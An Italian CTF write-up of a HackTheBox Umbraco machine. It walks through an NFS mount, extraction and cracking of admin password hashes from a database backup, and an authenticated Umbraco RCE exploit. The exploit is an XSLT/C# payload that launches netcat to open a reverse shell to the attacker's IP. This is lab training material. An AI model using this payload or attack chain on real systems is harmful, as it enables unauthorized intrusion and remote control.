## Information Gathering

Come qualsiasi CTF comincio con una prima analisi superficiale:

```
nmap -sV -A -T4 10.10.10.180
```
Scopro come servizi attivi, un webserver in ascolto sulla porta 80 ed un mount demon sulla porta 2049, puntante su */site_backups*.

A questo punto navigo un po nel sito web, trovo un form autenticativo per la parte di backoffice. Provo con delle credenziali basilari ma non succede nulla. Vedo se magari sono hardcoded nel BE, quindi monto il disco che è in ascolto in locale:

```
mount -t nfs 10.10.10.180:/site_backups /tmp/remote_htb/
```

Cerco la documentazione di Umbraco e trovo che i collegamenti a DB sono impostati all'interno del file Web.config, e la stringa identificativa è "umbracoDbDMS". Quindi eseguo un grep sul file di config:

```
cat Web.config | grep umbracoDbDMS
```

Trovo la stringa di riferimento e scopro che un file di backup del DB è salvato dentro il file *Umbraco.sdf*. Lo rintraccio all'interno della cartella *App_Data*, faccio un cat, strings ed head. Tramite il comando *head* trovo un po di stringhe interessanti ma confuse. Quindi devio il flusso su un file dump_pwd.txt, quindi scremo e trovo:

```                                                                                                    
admin@htb.local
b8be16afba8c314ad33d812f22a04991b90e2aaa
{"hashAlgorithm":"SHA1"}
smith@htb.local
8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA=
{"hashAlgorithm":"HMACSHA256"}
```

Rompo l'hash di admin (essendo uno sha1 risulta rompibile) con CrackStation (o John):
```
baconandcheese
```
Faccio quindi il login nell'apposito tab:
```
10.10.10.180/umbraco/#/login
```

## Web Exploitation

Studio il CMS sottostante e trovo la versione in running. Per questa versione rintraccio un exploit, il 46153.py. 
Dopo averlo studiato ne modifico il PoC in modo tale da poter eseguire NetCat che ho caricato in precedenza all'interno dell'Admin dashboard (il cui path globale, studiando la documentazione, scopro essere:v C:/inetpub/wwwroot/Media/):

```
'<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "10.10.14.147 4444 –e cmd.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "C:/inetpub/wwwroot/Media/1035/nc64.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> '
```

Avvio nc in ascolto anche sulla mia macchina ed eccomi collegato tramite una reverse shell! 